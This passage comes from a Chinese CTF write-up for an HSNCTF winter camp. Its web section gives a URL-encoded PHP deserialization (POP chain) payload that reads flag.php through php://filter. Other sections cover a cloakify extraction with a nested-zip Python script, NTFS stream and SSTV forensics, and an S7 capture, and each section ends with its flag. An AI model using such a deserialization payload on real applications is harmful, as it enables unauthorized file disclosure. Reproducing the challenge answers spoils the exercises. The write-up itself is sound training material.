src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/2.png"><br><code>unserialize($_POST[&#39;cmd&#39;]);</code>post传参cmd<br>payload：<br><code>cmd=O%3A3%3A%22red%22%3A1%3A%7Bs%3A2%3A%22r1%22%3BO%3A5%3A%22white%22%3A1%3A%7Bs%3A1%3A%22w%22%3BO%3A5%3A%22color%22%3A1%3A%7Bs%3A2%3A%22c1%22%3BO%3A4%3A%22blue%22%3A2%3A%7Bs%3A2%3A%22b1%22%3BO%3A3%3A%22red%22%3A1%3A%7Bs%3A2%3A%22r1%22%3BO%3A5%3A%22color%22%3A1%3A%7Bs%3A2%3A%22c1%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7Ds%3A2%3A%22b2%22%3BN%3B%7D%7D%7D%7D</code><br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/3.png"><br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/4.png"><br>:::tips<br>HSNCTF{537C532E-408B-FDCD-3E49-58E6FB578579}<br>:::</p><h3 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h3><p>用工具cloakify<br>kali：<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/5.png"><br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/6.png"><br>打开保存的文件<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/7.png"><br>改后缀zip<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/8.png"><br>zip套娃，文件名递减1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><br>count = <span class="hljs-number">2331</span><br><span class="hljs-keyword">while</span> count&gt;<span class="hljs-number">0</span>:<br>    path = <span class="hljs-string">&#x27;f&#x27;</span>+ <span class="hljs-built_in">str</span>(count) + <span class="hljs-string">&#x27;.zip&#x27;</span><br>    folder_abs = <span class="hljs-string">&#x27;.&#x27;</span><br><br>    zip_file = zipfile.ZipFile(path)<br>    zip_list = zip_file.namelist()<br><br>    <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> zip_list:<br>        zip_file.extract(f, folder_abs)<br>     <br>    zip_file.close()<br>    count -= <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>得到<img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/9.png"><br>:::tips<br>hsnctf{66eec912-e9ce-4e1d-ac54-ecea075dcb96}<br>:::</p><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/10.png"><br>:::tips<br>hsnctf{welcome_to_hsnctf}<br>:::</p><h3 id="外星电波"><a href="#外星电波" class="headerlink" title="外星电波~"></a>外星电波~</h3><p><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/11.png"><br>得到一个加密的压缩包<br>NTFS数据流加密<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/12.png"><br>得到音频，导出，sstv读<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/13.png"><br>解压缩包得到flag<br>:::tips<br>hsnctf{70995fb0-eb60-0787-f305-77066aeb6730}<br>:::</p><h3 id="daobudao"><a href="#daobudao" class="headerlink" title="daobudao"></a>daobudao</h3><p><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/14.png"><br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/15.png"><br>:::tips<br>hsnctf{g00d_luck_have_fun}<br>:::</p><h3 id="S7-analysis"><a href="#S7-analysis" class="headerlink" title="S7_analysis"></a>S7_analysis</h3><p>随便翻翻，看见一个stop<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/16.png"><br>:::tips<br> hsnctf{399}<br>:::</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
